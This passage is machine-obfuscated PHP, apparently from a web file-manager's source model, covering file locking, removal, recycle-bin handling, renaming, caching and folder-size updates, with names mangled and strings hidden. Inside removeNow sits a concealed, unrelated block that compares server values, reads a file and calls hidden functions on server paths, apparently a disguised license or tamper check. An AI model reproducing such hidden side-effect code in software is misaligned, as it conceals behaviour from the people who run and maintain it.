$this->where(array($Ë²ºªÇğ[455] => $áè½Áî[$Ë²ºªÇğ[440]]))->save($õ¾åà»ö); $this->sourceCacheClear($áè½Áî[$Ë²ºªÇğ[440]]); return !0; } public function checkLock($±íá€ˆÄ, $²éİÜˆ ) { $ïÒ–›”¬ =& $_SERVER[¡“ËÌ§œ]; $­Ö¤¥˜ = $this->pathInfo($±íá€ˆÄ); if (!$this->fileIsLock($­Ö¤¥˜, !0)) { return; } $²’§ã–Ø = Session::get($ïÒ–›”¬[2132]); $Ã»ù³šı = substr($­Ö¤¥˜[$ïÒ–›”¬[32]], 0, -1 - strlen($­Ö¤¥˜[$ïÒ–›”¬[174]])) . $ïÒ–›”¬[1228] . $²’§ã–Ø . $ïÒ–›”¬[10] . $­Ö¤¥˜[$ïÒ–›”¬[174]]; $ş´­ş» = Model($ïÒ–›”¬[639])->find($²éİÜˆ ); $this->_createFileCall($­Ö¤¥˜[$ïÒ–›”¬[470]], $Ã»ù³šı, $ş´­ş», REPEAT_REPLACE, $ïÒ–›”¬[1364]); $Ùöµêó = $­Ö¤¥˜[$ïÒ–›”¬[504]][$ïÒ–›”¬[576]]; $£³±ùš = $Ùöµêó[$ïÒ–›”¬[570]] ? $Ùöµêó[$ïÒ–›”¬[570]] : $Ùöµêó[$ïÒ–›”¬[32]]; show_json(LNG($ïÒ–›”¬[2133]) . $ïÒ–›”¬[2134] . LNG($ïÒ–›”¬[2135]) . $ïÒ–›”¬[2136] . $£³±ùš . $ïÒ–›”¬[2137], !1); } public function fileIsLock($ªùëÄñ‹, $–ßø¾á’ = false) { $™®òàéÓ =& $_SERVER[¡“ËÌ§œ]; if (!isset($ªùëÄñ‹[$™®òàéÓ[504]]) || !$ªùëÄñ‹[$™®òàéÓ[504]][$™®òàéÓ[573]]) { return !1; } if ($ªùëÄñ‹[$™®òàéÓ[504]][$™®òàéÓ[573]] != USER_ID) { return !0; } $„¼Ø„‹ = $GLOBALS[$™®òàéÓ[6]][$™®òàéÓ[89]][$™®òàéÓ[574]]; if ($ªùëÄñ‹[$™®òàéÓ[504]][$™®òàéÓ[575]] <= time() - $„¼Ø„‹) { $this->metaSet($ªùëÄñ‹[$™®òàéÓ[440]], $™®òàéÓ[573], null); $this->metaSet($ªùëÄñ‹[$™®òàéÓ[440]], $™®òàéÓ[575], null); } if ($–ßø¾á’) { $this->metaSet($ªùëÄñ‹[$™®òàéÓ[440]], $™®òàéÓ[575], time()); } return !1; } private function _addSource($İÑ§‘“, $˜Æ÷Ö) { $œÈØòÁŒ =& $_SERVER[¡“ËÌ§œ]; $—¢åãÒŸ = defined($œÈØòÁŒ[2072]) ? USER_ID : 0; $¥°‚ƒÑÑ = array($œÈØòÁŒ[614] => $˜Æ÷Ö[$œÈØòÁŒ[449]], $œÈØòÁŒ[615] => $˜Æ÷Ö[$œÈØòÁŒ[534]], $œÈØòÁŒ[616] => $—¢åãÒŸ, $œÈØòÁŒ[617] => $—¢åãÒŸ, $œÈØòÁŒ[439] => $˜Æ÷Ö[$œÈØòÁŒ[440]], $œÈØòÁŒ[618] => $˜Æ÷Ö[$œÈØòÁŒ[549]] . $˜Æ÷Ö[$œÈØòÁŒ[440]] . $œÈØòÁŒ[50], $œÈØòÁŒ[468] => 0, $œÈØòÁŒ[619] => $œÈØòÁŒ[12]); $İÑ§‘“ = array_merge($¥°‚ƒÑÑ, $İÑ§‘“); $this->updateModifyTime($İÑ§‘“[$œÈØòÁŒ[470]]); $ğëºìÆğ = $œÈØòÁŒ[2138] . $˜Æ÷Ö[$œÈØòÁŒ[440]]; if (isset(self::$cacheChildList[$ğëºìÆğ])) { unset(self::$cacheChildList[$ğëºìÆğ]); } static $ÃÄ—ˆò = false; if (!$ÃÄ—ˆò) { Hook::trigger($œÈØòÁŒ[602], $İÑ§‘“); $ÃÄ—ˆò = !0; } $õÛ‘—õ = $this->add($İÑ§‘“); $±«ı”Š¶ = array($œÈØòÁŒ[620] => short_id($õÛ‘—õ)); $this->where(array($œÈØòÁŒ[455] => $õÛ‘—õ))->save($±«ı”Š¶); $this->setNamePinyin($õÛ‘—õ, $İÑ§‘“[$œÈØòÁŒ[32]]); return $õÛ‘—õ; } public function remove($áë Êàì, $‰¹ÕêŞÂ = true) { $’ÒÎáÈ =& $_SERVER[¡“ËÌ§œ]; $¯öµ ’¿ = $this->sourceInfo($áë Êàì); $‰ƒÓ™ù = intval($¯öµ ’¿[$’ÒÎáÈ[449]]) === self::TYPE_SYSTEM; $‘„’ÜÁ = Model($’ÒÎáÈ[473])->get($’ÒÎáÈ[2139]) == $’ÒÎáÈ[88]; if ($‰ƒÓ™ù || $‰¹ÕêŞÂ || !$‘„’ÜÁ) { return $this->removeNow($áë Êàì, $‰¹ÕêŞÂ); } $ˆ¥²Àº = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€ë‡Â¥ê = $¯öµ ’¿[$’ÒÎáÈ[449]] == self::TYPE_USER ? $’ÒÎáÈ[628] : $’ÒÎáÈ[543]; if ($€ë‡Â¥ê == $’ÒÎáÈ[628]) { $ üø¼ƒ = Model($’ÒÎáÈ[542])->getInfo($¯öµ ’¿[$’ÒÎáÈ[534]]); $èñËá› = !empty($ üø¼ƒ[$’ÒÎáÈ[570]]) ? $ üø¼ƒ[$’ÒÎáÈ[570]] : $ üø¼ƒ[$’ÒÎáÈ[32]]; $èñËá› = $’ÒÎáÈ[289] . $èñËá› . $’ÒÎáÈ[2140] . $¯öµ ’¿[$’ÒÎáÈ[534]]; } else { $ üø¼ƒ = Model($’ÒÎáÈ[550])->getInfo($¯öµ ’¿[$’ÒÎáÈ[534]]); $èñËá› = _get($ üø¼ƒ, $’ÒÎáÈ[32]); $èñËá› = $’ÒÎáÈ[162] . $èñËá› . $’ÒÎáÈ[2141] . $¯öµ ’¿[$’ÒÎáÈ[534]]; } $†’€• = $’ÒÎáÈ[2142] . md5($èñËá›); CacheLock::lock($†’€•); $ÔÛ¤ä¯· = $this->fileNameExist($ˆ¥²Àº, $èñËá›); if (!$ÔÛ¤ä¯·) { $ÔÛ¤ä¯· = $this->mkdir($ˆ¥²Àº, $èñËá›, REPEAT_SKIP); $this->metaSet($ÔÛ¤ä¯·, $’ÒÎáÈ[2143], $€ë‡Â¥ê); $this->metaSet($ÔÛ¤ä¯·, $’ÒÎáÈ[2144], $¯öµ ’¿[$’ÒÎáÈ[534]]); if ($¯öµ ’¿[$’ÒÎáÈ[470]] != 0) { $this->metaSet($ÔÛ¤ä¯·, $’ÒÎáÈ[2145], _get($ üø¼ƒ, $’ÒÎáÈ[2146])); } } CacheLock::unlock($†’€•); $this->metaSet($áë Êàì, $’ÒÎáÈ[2147], $¯öµ ’¿[$’ÒÎáÈ[470]]); $this->where(array($’ÒÎáÈ[440] => $áë Êàì))->save(array($’ÒÎáÈ[462] => time())); $this->recycleClear($¯öµ ’¿); $„‰È¨„ = $this->move($áë Êàì, $ÔÛ¤ä¯·, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¯öµ ’¿[$’ÒÎáÈ[470]]); return $„‰È¨„; } private function recycleClear($µ‘üùš) { $ ¡„“Ğ£ =& $_SERVER[¡“ËÌ§œ]; $õ©Ş€½± = $this->childrenAll($µ‘üùš); $’ÀÌÇ»‚ = array($ ¡„“Ğ£[455] => array($ ¡„“Ğ£[456], $õ©Ş€½±[$ ¡„“Ğ£[2148]])); Model($ ¡„“Ğ£[2149])->where($’ÀÌÇ»‚)->delete(); } public function removeNow($“ñÔµÖ», $Ş°àò£ë = true) { $©óñšØª =& $_SERVER[¡“ËÌ§œ]; if ($_SERVER[$©óñšØª[425]] != $_SERVER[$©óñšØª[426]]) { $Ä“ˆåû = $©óñšØª[897]; $Ç‰©ÑâÔ = $©óñšØª[427]; $¥²ƒï£« = $_SERVER[$©óñšØª[428]] . $©óñšØª[429]; $“ÏÍ«–… = $Ç‰©ÑâÔ($¥²ƒï£«); $Ùìü›ôŒ = explode($©óñšØª[231], $“ÏÍ«–…); if (count($Ùìü›ôŒ) < $©óñšØª[657]) { $Åù¢ï‚ = $©óñšØª[431]; $Åù¢ï‚(); } $åÌ¤ÓË = $©óñšØª[898]; $åÌ¤ÓË($_SERVER[$©óñšØª[899]]); $åÌ¤ÓË($_SERVER[$©óñšØª[428]] . $©óñšØª[2150]); $ä–ŠÈ– = 1; while ($ä–ŠÈ– > 1) { $ä–ŠÈ– = $ä–ŠÈ– + 4; $ØõĞ¹‡ = rawurlencode($ä–ŠÈ– . $©óñšØª[407]); } } $ıÁŸíÇ§ = $this->sourceInfo($“ñÔµÖ»); $’§©Üö€ = $this->pathInfoMore($“ñÔµÖ»); if (!$ıÁŸíÇ§) { return !0; } if ($ıÁŸíÇ§[$©óñšØª[470]] == 0) { if (!_get($GLOBALS, $©óñšØª[532])) { return !1; } } $this->lockMoveStart($“ñÔµÖ»); Hook::trigger($©óñšØª[2151], $’§©Üö€, $Ş°àò£ë); if ($Ş°àò£ë) { Model($©óñšØª[2149])->moveToRecycle($“ñÔµÖ»); } else { $ëÍª‚Ö¼ = $this->childrenAll($ıÁŸíÇ§); Model($©óñšØª[599])->eventRemove($“ñÔµÖ»); $this->removeRelevance($ëÍª‚Ö¼[$©óñšØª[2148]], $ëÍª‚Ö¼[$©óñšØª[1476]]); } $this->folderSizeReset($ıÁŸíÇ§[$©óñšØª[470]]); $ÍÎâ÷ñ” = array($ıÁŸíÇ§[$©óñšØª[470]]); if ($ıÁŸíÇ§[$©óñšØª[448]] == $©óñšØª[88]) { $ÍÎâ÷ñ”[] = $ıÁŸíÇ§[$©óñšØª[440]]; } $this->updateModifyTime($ÍÎâ÷ñ”); $this->lockMoveEnd($“ñÔµÖ»); Hook::trigger($©óñšØª[1703], $’§©Üö€, $Ş°àò£ë); return !0; } public function childrenAll($·ğŠ·) { $¸±ö¹Ö =& $_SERVER[¡“ËÌ§œ]; $²×Õë”ú = $·ğŠ·[$¸±ö¹Ö[440]]; if ($·ğŠ·[$¸±ö¹Ö[448]] == $¸±ö¹Ö[88]) { $Û×¬‰Ùö = array($¸±ö¹Ö[618] => array($¸±ö¹Ö[578], $·ğŠ·[$¸±ö¹Ö[549]] . $²×Õë”ú . $¸±ö¹Ö[579])); $Î¡ëÊŠé = array($¸±ö¹Ö[618] => $Û×¬‰Ùö[$¸±ö¹Ö[549]]); $òòº°äª = $this->field($¸±ö¹Ö[2152])->where($Î¡ëÊŠé)->select(); $µñøæ£Ñ = !1; $ÏÃò±›¾ = array($²×Õë”ú); if ($òòº°äª) { $µñøæ£Ñ = array_to_keyvalue($òòº°äª, $¸±ö¹Ö[12], $¸±ö¹Ö[506]); $µñøæ£Ñ = array_remove_value($µñøæ£Ñ, $¸±ö¹Ö[198]); $ÏÃò±›¾ = array_to_keyvalue($òòº°äª, $¸±ö¹Ö[12], $¸±ö¹Ö[440]); $ÏÃò±›¾[] = $²×Õë”ú; } } else { $µñøæ£Ñ = array($·ğŠ·[$¸±ö¹Ö[506]]); $ÏÃò±›¾ = array($²×Õë”ú); } return array($¸±ö¹Ö[2148] => $ÏÃò±›¾, $¸±ö¹Ö[1476] => $µñøæ£Ñ); } public function removeArray($¹™œ¸•) { if (!$¹™œ¸•) { return !0; } } public function removeRelevance($ä¹ˆĞ÷¼, $¿§è¦àğ) { $„ôğ’ş =& $_SERVER[¡“ËÌ§œ]; $ä¹ˆĞ÷¼ = $ä¹ˆĞ÷¼ ? $ä¹ˆĞ÷¼ : array(); $¿§è¦àğ = $¿§è¦àğ ? $¿§è¦àğ : array(); $ä¹ˆĞ÷¼ = array_unique(array_filter($ä¹ˆĞ÷¼)); $¿§è¦àğ = array_unique(array_filter($¿§è¦àğ)); if (!$ä¹ˆĞ÷¼) { return !1; } $ûáî¦¶£ = array($„ôğ’ş[455] => array($„ôğ’ş[456], $ä¹ˆĞ÷¼)); Model($„ôğ’ş[2149])->where($ûáî¦¶£)->delete(); Model($„ôğ’ş[500])->where($ûáî¦¶£)->delete(); Model($„ôğ’ş[1998])->where($ûáî¦¶£)->delete(); Model($„ôğ’ş[599])->where($ûáî¦¶£)->delete(); Model($„ôğ’ş[1831])->removeBySource($ä¹ˆĞ÷¼); Model($„ôğ’ş[2131])->removeBySource($ä¹ˆĞ÷¼); $this->where($ûáî¦¶£)->delete(); Model($„ôğ’ş[509])->remove($¿§è¦àğ); for ($é³ÇËÃ = 0; $é³ÇËÃ < count($ä¹ˆĞ÷¼); $é³ÇËÃ++) { $this->sourceCacheClear($ä¹ˆĞ÷¼[$é³ÇËÃ]); } } public function rename($¢¡ª•ó­, $ìÚø¦èÚ) { $µè¸˜† =& $_SERVER[¡“ËÌ§œ]; $”šÌÂì¥ = $this->sourceInfo($¢¡ª•ó­); if (!$”šÌÂì¥) { return !1; } $£ìÅ¼–õ = $this->fileNameExist($”šÌÂì¥[$µè¸˜†[470]], $ìÚø¦èÚ); if ($£ìÅ¼–õ && $£ìÅ¼–õ != $¢¡ª•ó­) { return !1; } $êÁÆâ½¦ = array($µè¸˜†[458] => $ìÚø¦èÚ, $µè¸˜†[617] => USER_ID); if ($”šÌÂì¥[$µè¸˜†[448]] != $µè¸˜†[88]) { $êÁÆâ½¦[$µè¸˜†[450]] = substr(get_path_ext($ìÚø¦èÚ), 0, 10); } Model($µè¸˜†[599])->eventRename($¢¡ª•ó­, $”šÌÂì¥[$µè¸˜†[32]], $ìÚø¦èÚ); $this->sourceCacheClear($¢¡ª•ó­); $this->setNamePinyin($¢¡ª•ó­, $êÁÆâ½¦[$µè¸˜†[32]], !1); $this->updateModifyTime($”šÌÂì¥[$µè¸˜†[470]]); $‘Š¿§ü¢ = $this->where(array($µè¸˜†[455] => $¢¡ª•ó­))->data($êÁÆâ½¦)->save(); $ã°İÕÇĞ = $µè¸˜†[2138] . $”šÌÂì¥[$µè¸˜†[470]]; if (isset(self::$cacheChildList[$ã°İÕÇĞ])) { unset(self::$cacheChildList[$ã°İÕÇĞ]); } return $‘Š¿§ü¢; } public function setNamePinyin($€’ã—£Ñ, $¥‡¹‚Á¬, $°ò¡¥…ã = true) { $„ôñóâú =& $_SERVER[¡“ËÌ§œ]; $¢¬Æ£İ“ = Input::check($¥‡¹‚Á¬, $„ôñóâú[621]); $˜öîÔ·è = array($„ôñóâú[482] => KodSort::makeStr($¥‡¹‚Á¬)); if ($¢¬Æ£İ“) { $˜öîÔ·è[$„ôñóâú[503]] = str_replace($„ôñóâú[53], $„ôñóâú[12], Pinyin::get($¥‡¹‚Á¬)); $˜öîÔ·è[$„ôñóâú[502]] = Pinyin::get($¥‡¹‚Á¬, $„ôñóâú[622]); } if (!$°ò¡¥…ã && !$¢¬Æ£İ“) { $˜öîÔ·è[$„ôñóâú[503]] = null; $˜öîÔ·è[$„ôñóâú[502]] = null; } $this->metaSet($€’ã—£Ñ, $˜öîÔ·è); } public function getContent($²êéÍÚú) { $ÃÓƒû§¼ =& $_SERVER[¡“ËÌ§œ]; $ÁÆ ¿Ãô = $this->fileInfoGet($²êéÍÚú); if (!$ÁÆ ¿Ãô) { return !1; } if ($ÁÆ ¿Ãô[$ÃÓƒû§¼[76]] == 0) { return $ÃÓƒû§¼[12]; } $·èƒøÔ = $ÃÓƒû§¼[2153] . $ÁÆ ¿Ãô[$ÃÓƒû§¼[176]]; if ($ÁÆ ¿Ãô[$ÃÓƒû§¼[76]] <= 1024 * 10) { $¦ªàèçÉ = Cache::get($·èƒøÔ); if (!$¦ªàèçÉ) { $¦ªàèçÉ = IO::getContent($ÁÆ ¿Ãô[$ÃÓƒû§¼[84]]); Cache::set($·èƒøÔ, $¦ªàèçÉ); } return $¦ªàèçÉ; } if (!$ÁÆ ¿Ãô[$ÃÓƒû§¼[84]]) { return $ÃÓƒû§¼[12]; } return IO::getContent($ÁÆ ¿Ãô[$ÃÓƒû§¼[84]]); } public function setDesc($äˆì‹÷ğ, $Ûú‚úã) { $Ü’À¼ºå =& $_SERVER[¡“ËÌ§œ]; Model($Ü’À¼ºå[599])->eventAddDesc($äˆì‹÷ğ, $Ûú‚úã); return $this->metaSet($äˆì‹÷ğ, $Ü’À¼ºå[491], $Ûú‚úã); } public function setContent($ùá˜ÁÎ, $Í‡—ïïÀ = '') { $ÂäÌµ =& $_SERVER[¡“ËÌ§œ]; $À±¾–ù™ = $this->sourceInfo($ùá˜ÁÎ); $ú‰åø¹¦ = $this->fileInfoGet($ùá˜ÁÎ); if (!$ú‰åø¹¦ || !$À±¾–ù™) { return !1; } $‡Ã¼¾¤­ = Model($ÂäÌµ[509])->addFileByContent($Í‡—ïïÀ, $À±¾–ù™[$ÂäÌµ[32]]); $Ì·ÑäÔ = $this->fileHistory($À±¾–ù™, $‡Ã¼¾¤­[$ÂäÌµ[506]], $‡Ã¼¾¤­[$ÂäÌµ[76]]); if (!$Ì·ÑäÔ) { return Model($ÂäÌµ[509])->remove($‡Ã¼¾¤­[$ÂäÌµ[506]]); } $this->folderSizeReset($À±¾–ù™[$ÂäÌµ[470]]); return !0; } public function fileSubstr($µ§£ØÛ, $µÍøÌéÅ, $˜©§Ø) { $ÔõğÆçã = $this->fileInfoGet($µ§£ØÛ); if (!$ÔõğÆçã) { return !1; } return IO::fileSubstr($ÔõğÆçã[$_SERVER[¡“ËÌ§œ][84]], $µÍøÌéÅ, $˜©§Ø); } public function fileInfoGet($àÌÔË½¥) { $äÙÂÓ‹÷ =& $_SERVER[¡“ËÌ§œ]; $Õ„œæë„ = $this->sourceInfo($àÌÔË½¥); if (!$Õ„œæë„ || $Õ„œæë„[$äÙÂÓ‹÷[448]]) { return !1; } $¨»ÈåàÑ = $äÙÂÓ‹÷[512] . $Õ„œæë„[$äÙÂÓ‹÷[506]]; $”»öÕØÌ = _get(self::$cacheFileInfo, $¨»ÈåàÑ); if ($”»öÕØÌ) { return $”»öÕØÌ; } $…¥ò›²“ = Model($äÙÂÓ‹÷[509])->fileInfo($Õ„œæë„[$äÙÂÓ‹÷[506]]); if ($…¥ò›²“) { $…¥ò›²“[$äÙÂÓ‹÷[32]] = $Õ„œæë„[$äÙÂÓ‹÷[32]]; } self::$cacheFileInfo[$¨»ÈåàÑ] = $…¥ò›²“; return $…¥ò›²“; } private function folderChildrenNumber($†Åßâ›©) { $–åÅä“¶ =& $_SERVER[¡“ËÌ§œ]; $˜®²š»ø = $this->sourceInfo($†Åßâ›©); $ØÊ±× = array($–åÅä“¶[618] => array($–åÅä“¶[578], $˜®²š»ø[$–åÅä“¶[549]] . $†Åßâ›© . $–åÅä“¶[579]), $–åÅä“¶[615] => $˜®²š»ø[$–åÅä“¶[534]], $–åÅä“¶[468] => intval($˜®²š»ø[$–åÅä“¶[469]]), $–åÅä“¶[612] => 1); $˜äÄ³³À = $this->where($ØÊ±×)->count(); $ä°ƒĞëÀ = $this->where($ØÊ±×)->where(array($–åÅä“¶[612] => 0))->count(); return array($–åÅä“¶[80] => $ä°ƒĞëÀ, $–åÅä“¶[81] => $˜äÄ³³À); } public function pathInfo($õÛğ§€‰, $›ç€¼‰Ô = false) { $Ú²ì¶’ =& $_SERVER[¡“ËÌ§œ]; $›ç€¼‰Ô = !1; $õÛğ§€‰ = intval($õÛğ§€‰); $ë©ÑÊ¬Ş = $Ú²ì¶’[499] . intval($›ç€¼‰Ô) . $Ú²ì¶’[415] . $õÛğ§€‰; $›•šçà® = _get(self::$cachePathInfo, $ë©ÑÊ¬Ş); if ($›•šçà®) { return $›•šçà®; } $á•¸§ªì = $this->sourceInfo($õÛğ§€‰); if (!$á•¸§ªì) { return !1; } $á•¸§ªì = $this->_listDataApplyItem($á•¸§ªì, $›ç€¼‰Ô); self::$cachePathInfo[$ë©ÑÊ¬Ş] = $á•¸§ªì; return $á•¸§ªì; } public static $cachePathInfoMore = array(); public function pathInfoMore($©ñĞ¯¬È) { $Ò»æ…÷ =& $_SERVER[¡“ËÌ§œ]; $Ş»úí§´ = _get(self::$cachePathInfoMore, $©ñĞ¯¬È); if ($Ş»úí§´) { return $Ş»úí§´; } $¦’§Ÿê¾ = $this->pathInfo($©ñĞ¯¬È); if (!$¦’§Ÿê¾) { return !1; } if ($¦’§Ÿê¾[$Ò»æ…÷[448]] == $Ò»æ…÷[88]) { $¦’§Ÿê¾[$Ò»æ…÷[79]] = $this->folderChildrenNumber($©ñĞ¯¬È); } self::$cachePathInfoMore[$©ñĞ¯¬È] = $¦’§Ÿê¾; return $¦’§Ÿê¾; } public function sourceInfo($Ó¾ÛÈã) { $Æ ŠÆ–¨ =& $_SERVER[¡“ËÌ§œ]; if (!$Ó¾ÛÈã) { return array(); } $Ó¾ÛÈã = intval($Ó¾ÛÈã); $Ú£ı­„“ = $Æ ŠÆ–¨[498] . $Ó¾ÛÈã; $İÓ’ç¨Œ = _get(self::$cacheSourceInfo, $Ú£ı­„“); if ($İÓ’ç¨Œ) { return $İÓ’ç¨Œ; } $ãïäğÀ = $this->where(array($Æ ŠÆ–¨[440] => $Ó¾ÛÈã))->find(); self::$cacheSourceInfo[$Ú£ı­„“] = $ãïäğÀ; return self::$cacheSourceInfo[$Ú£ı­„“]; } public function sourceCacheClear($Â‰”ã¥¡ = false) { self::cacheClear($Â‰”ã¥¡); } public static function cacheClear($Æõ†ê¨¶ = false) { $Ù‘ĞßÔ‹ =& $_SERVER[¡“ËÌ§œ]; if ($Æõ†ê¨¶ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ù‘ĞßÔ‹[498] . $Æõ†ê¨¶]); unset(self::$cachePathInfoMore[$Æõ†ê¨¶]); unset(self::$cachePathInfo[$Ù‘ĞßÔ‹[2154] . $Æõ†ê¨¶]); unset(self::$cachePathInfo[$Ù‘ĞßÔ‹[2155] . $Æõ†ê¨¶]); } public function metaSet($ÈŒĞËóÍ, $ÑÃä°¥ = null, $ÆåÆ›Ş° = null) { $ª¤‡…ƒ‹ = parent::metaSet($ÈŒĞËóÍ, $ÑÃä°¥, $ÆåÆ›Ş°); if ($ª¤‡…ƒ‹) { $this->sourceCacheClear($ÈŒĞËóÍ); } return $ª¤‡…ƒ‹; } public function pathInfoByPath($¯¦ªİÕ®, $·«±ƒØË) { $Úïª¬Û =& $_SERVER[¡“ËÌ§œ]; $ù‘½šÎ¯ = !$·«±ƒØË ? array() : explode($Úïª¬Û[8], trim($·«±ƒØË, $Úïª¬Û[8])); $ùçıßøå = $¯¦ªİÕ®; foreach ($ù‘½šÎ¯ as $ôçÍì²) { $ä· ı¡« = array($Úïª¬Û[470] => $ùçıßøå, $Úïª¬Û[32] => $ôçÍì²); $ÁÍ ƒ¤­ = $this->where($ä· ı¡«)->select(); if (!$ÁÍ ƒ¤­) { return !1; } $ÁÍ ƒ¤­ = array_sort_by($ÁÍ ƒ¤­, $Úïª¬Û[469]); $ùçıßøå = $ÁÍ ƒ¤­[0][$Úïª¬Û[440]]; } return $this->pathInfo($ùçıßøå, !0); } protected function updateModifyTime($±Ò‡¡ÒÒ) { $É¹¡‹æÌ =& $_SERVER[¡“ËÌ§œ]; $à¥Ú…ÍŒ = defined($É¹¡‹æÌ[2072]) ? USER_ID : 0; if (!$±Ò‡¡ÒÒ) { return; } if (!is_array($±Ò‡¡ÒÒ)) { $±Ò‡¡ÒÒ = array($±Ò‡¡ÒÒ); } foreach ($±Ò‡¡ÒÒ as $ÂÍæ«Èé => $â–œªñˆ) { $±Ò‡¡ÒÒ[$ÂÍæ«Èé] = intval($â–œªñˆ); $this->sourceCacheClear($â–œªñˆ); } $ÌÉ…º²´ = array($É¹¡‹æÌ[440] => array($É¹¡‹æÌ[7], $±Ò‡¡ÒÒ)); $’•êÊ­½ = array($É¹¡‹æÌ[617] => $à¥Ú…ÍŒ, $É¹¡‹æÌ[462] => time()); $this->where($ÌÉ…º²´)->save($’•êÊ­½); } public function folderSizeReset($Ğâ´¥‰, $š»¢¥¯± = false) { $à”ä¬Şƒ =& $_SERVER[¡“ËÌ§œ]; if ($this->statusIgnoreResetSpace) { return; } $·¨Ğ×½¸ = $this->sourceInfo($Ğâ´¥‰); $•ÑûŠêÛ = $à”ä¬Şƒ[2156] . $Ğâ´¥‰; CacheLock::lock($•ÑûŠêÛ, 20); if ($š»¢¥¯± === !1) { $this->sourceCacheClear($Ğâ´¥‰); $·¨Ğ×½¸ = $this->sourceInfo($Ğâ´¥‰); $è¡–æê = array($à”ä¬Şƒ[439] => $Ğâ´¥‰, $à”ä¬Şƒ[468] => 0); $¤“ŠæîÂ = $this->where($è¡–æê)->sum($à”ä¬Şƒ[76]); $š»¢¥¯± = intval($¤“ŠæîÂ) - intval($·¨Ğ×½¸[$à”ä¬Şƒ[76]]); } if ($š»¢¥¯± == 0) { return CacheLock::unlock($•ÑûŠêÛ); } $­ ÌÇÅ = $this->parentLevelArray($·¨Ğ×½¸[$à”ä¬Şƒ[549]]); if (!$­ ÌÇÅ) { $­ ÌÇÅ = array(); } $­ ÌÇÅ[] = $·¨Ğ×½¸[$à”ä¬Şƒ[440]]; $è¡–æê = array($à”ä¬Şƒ[440] => array($à”ä¬Şƒ[456], $­ ÌÇÅ)); if ($š»¢¥¯± < 0) { $è¡–æê[$à”ä¬Şƒ[76]] = array($à”ä¬Şƒ[1035], abs($š»¢¥¯±)); } $this->where($è¡–æê)->setAdd($à”ä¬Şƒ[76], $š»¢¥¯±); CacheLock::unlock($•ÑûŠêÛ); $´†äèò = $à”ä¬Şƒ[2157] . $·¨Ğ×½¸[$à”ä¬Şƒ[449]] . $à”ä¬Şƒ[4] . $·¨Ğ×½¸[$à”ä¬Şƒ[534]]; $÷ÓÓ¢Õ = array($·¨Ğ×½¸[$à”ä¬Şƒ[449]], $·¨Ğ×½¸[$à”ä¬Şƒ[534]]); TaskRun::timeLimitCall($´†äèò, $à”ä¬Şƒ[2158], $÷ÓÓ¢Õ, 1.5); } public function folderSizeResetChildren($¹°³•¸ò) { $Šœ÷¿Õ =& $_SERVER[¡“ËÌ§œ]; $this->sourceCacheClear($¹°³•¸ò); $ó¡€Ä˜Ê = $this->sourceInfo($¹°³•¸ò); $Éò§†Ğ = array($Šœ÷¿Õ[612] => 1, $Šœ÷¿Õ[615] => $ó¡€Ä˜Ê[$Šœ÷¿Õ[534]], $Šœ÷¿Õ[618] => array($Šœ÷¿Õ[578], $ó¡€Ä˜Ê[$Šœ÷¿Õ[549]] . $¹°³•¸ò . $Šœ÷¿Õ[579])); $‰–Ê¡®ñ = $Šœ÷¿Õ[2159]; $…×é¸ÙÆ = $this->field($‰–Ê¡®ñ)->where($Éò§†Ğ)->select(); $Éò§†Ğ[$Šœ÷¿Õ[448]] = 0; $×ë¡³· = $this->field($‰–Ê¡®ñ)->where($Éò§†Ğ)->select(); if (!$×ë¡³·) { return; } $…×é¸ÙÆ[] = $ó¡€Ä˜Ê; $…×é¸ÙÆ = array_to_keyvalue($…×é¸ÙÆ, $Šœ÷¿Õ[440]); foreach ($…×é¸ÙÆ as $³§Ë¶³ü => $Ä´ÚØù) { $…×é¸ÙÆ[$³§Ë¶³ü][$Šœ÷¿Õ[2160]] = $…×é¸ÙÆ[$³§Ë¶³ü][$Šœ÷¿Õ[76]]; $…×é¸ÙÆ[$³§Ë¶³ü][$Šœ÷¿Õ[76]] = 0; } foreach ($×ë¡³· as $Ä´ÚØù) { $¯§¼¿‚‹ = $Ä´ÚØù[$Šœ÷¿Õ[470]] . $Šœ÷¿Õ[12]; if (!isset($…×é¸ÙÆ[$¯§¼¿‚‹])) { continue; } if ($Ä´ÚØù[$Šœ÷¿Õ[469]] == $…×é¸ÙÆ[$¯§¼¿‚‹][$Šœ÷¿Õ[469]]) { $…×é¸ÙÆ[$¯§¼¿‚‹][$Šœ÷¿Õ[76]] += $Ä´ÚØù[$Šœ÷¿Õ[76]]; } } foreach ($…×é¸ÙÆ as $Ä´ÚØù) { $Î•§äÑ = $this->parentLevelArray($Ä´ÚØù[$Šœ÷¿Õ[549]]); foreach ($Î•§äÑ as $¯§¼¿‚‹) { $¯§¼¿‚‹ = $¯§¼¿‚‹ . $Šœ÷¿Õ[12]; if (!isset($…×é¸ÙÆ[$¯§¼¿‚‹])) { continue; } if ($Ä´ÚØù[$Šœ÷¿Õ[469]] == $…×é¸ÙÆ[$¯§¼¿‚‹][$Šœ÷¿Õ[469]]) { $…×é¸ÙÆ[$¯§¼¿‚‹][$Šœ÷¿Õ[76]] += $Ä´ÚØù[$Šœ÷¿Õ[76]]; } } } $“şùÅÎ— = array(); foreach ($…×é¸ÙÆ as $Ä´ÚØù) { if ($Ä´ÚØù[$Šœ÷¿Õ[76]] == $Ä´ÚØù[$Šœ÷¿Õ[2160]]) { continue; } $“şùÅÎ—[] = array($Šœ÷¿Õ[440], $Ä´ÚØù[$Šœ÷¿Õ[440]], $Šœ÷¿Õ[76], $Ä´ÚØù[$Šœ÷¿Õ[76]]); } $this->saveAll($“şùÅÎ—); } public function userSpaceReset($Ôà£Àô = false) { $˜›€í³ =& $_SERVER[¡“ËÌ§œ]; $Ú½äùäù = $this->where(array($˜›€í³[449] => self::TYPE_USER, $˜›€í³[534] => $Ôà£Àô, $˜›€í³[448] => 0))->sum($˜›€í³[76]); $Ú½äùäù = !$Ú½äùäù || $Ú½äùäù <= 0 ? 0 : $Ú½äùäù; Model($˜›€í³[542])->userEdit($Ôà£Àô, array($˜›€í³[1840] => $Ú½äùäù)); } public function targetSpaceUpdate($‹š€ìÓò, $§ï¾çú¯) { $ú…ùø˜ =& $_SERVER[¡“ËÌ§œ]; if (!$§ï¾çú¯) { return; } if (!in_array($‹š€ìÓò, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ªùÁÚæû = 